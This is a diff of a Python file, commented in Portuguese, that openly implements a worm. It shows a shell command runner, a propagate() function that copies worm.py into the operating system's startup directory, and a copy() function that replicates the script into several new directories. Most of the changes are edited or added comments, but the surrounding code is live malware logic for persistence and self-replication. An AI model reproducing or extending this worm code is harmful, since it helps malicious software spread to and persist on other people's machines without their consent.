@@ -11,12 +11,13 @@ import subprocess as sp
 import shutil
 import subprocess
 
-# Função para criptografar um arquivo
+# Função para rodar um comando no terminal
 def run_command(command):
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     stdout, stderr = process.communicate()
     return process.returncode, stdout, stderr
 
+# Função para propagar o worm
 def propagate():
     # Copiando o worm para o diretório de inicialização do sistema operacional
     source = os.path.abspath("worm.py")
@@ -52,13 +53,12 @@ def propagate():
 def copy():
     # Copiando o worm para o diretório de inicialização do sistema operacional
     script = argv
-
     name = str(script[0])
-
     brutal = os.path.abspath(name)
 
     for i in range(0, 4):
         try:
+            # Criando um diretório para copiar o worm
             directoryName = "copy"+str(i)
             os.mkdir(directoryName)
             shutil.copy2(brutal, directoryName)
